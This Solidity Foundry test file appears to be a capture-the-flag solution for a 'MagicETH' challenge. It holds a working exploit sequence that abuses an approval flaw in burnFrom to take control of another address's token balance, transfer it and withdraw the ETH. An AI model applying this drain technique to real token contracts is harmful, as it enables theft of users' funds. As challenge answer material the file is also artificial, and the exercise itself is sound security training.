// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {MagicETH} from "../src/1_MagicETH/MagicETH.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/

/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge1Test is Test {
    MagicETH public mETH;

    address public exploiter = makeAddr("exploiter");
    address public whitehat = makeAddr("whitehat");

    function setUp() public {
        mETH = new MagicETH();

        mETH.deposit{value: 1000 ether}();
        // exploiter is in control of 1000 tokens
        mETH.transfer(exploiter, 1000 ether);
    }

    function testExploit() public {
        vm.startPrank(whitehat, whitehat);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge1Test -vvvv //
        ////////////////////////////////////////////////////*/

        //==================================================//

        // drain exploiter mETH balance (by burning)
        mETH.approve(exploiter, type(uint256).max);
        // get approval on all the exploiter's mETH
        mETH.burnFrom(exploiter, 0);

        // transfer all the exploiter's mETH to the whitehat
        mETH.transferFrom(exploiter, whitehat, 1000 ether);

        // convert to ETH
        mETH.withdraw(1000 ether);

        vm.stopPrank();

        assertEq(
            whitehat.balance,
            1000 ether,
            "whitehat should have 1000 ether"
        );
    }
}
